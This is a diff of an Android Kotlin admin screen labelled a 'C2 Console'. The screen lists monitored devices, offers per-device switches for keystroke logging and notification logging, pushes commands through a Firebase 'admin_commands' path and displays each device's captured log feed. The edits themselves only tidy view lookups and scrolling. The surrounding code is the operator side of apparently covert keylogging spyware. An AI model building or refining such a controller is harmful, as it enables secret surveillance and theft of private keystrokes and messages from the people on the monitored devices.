@@ -47,8 +47,8 @@ class AdminMainActivity : AppCompatActivity() {
         }
         setContentView(R.layout.activity_admin_main)
 
-        txtTotalDevices = findViewById(R.id.txtTotalDevices)
-        txtTotalEvents = findViewById(R.id.txtTotalEvents)
+        txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
+        txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
@@ -56,7 +56,7 @@ class AdminMainActivity : AppCompatActivity() {
             Toast.makeText(this, "C2 Console synced!", Toast.LENGTH_SHORT).show()
         }
 
-        recyclerView = findViewById(R.id.recyclerViewDevices)
+        recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
             val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
@@ -212,12 +212,10 @@ class AdminMainActivity : AppCompatActivity() {
     ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {
 
         class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
-            val txtName: TextView = view.findViewById(R.id.txtDeviceName)
-            val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
-            val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
-            val txtLog: TextView = view.findViewById(R.id.txtDeviceLogConsole).apply {
-                movementMethod = ScrollingMovementMethod()
-            }
+            val txtName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
+            val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
+            val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
+            val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -245,10 +243,7 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#DA3633"))
             }
 
-            holder.txtLog.setOnTouchListener { v, event ->
-                v.parent.requestDisallowInterceptTouchEvent(true)
-                false
-            }
+            holder.txtLog.movementMethod = ScrollingMovementMethod()
             holder.txtLog.text = device.logFeed
 
             holder.btnKey.setOnClickListener {
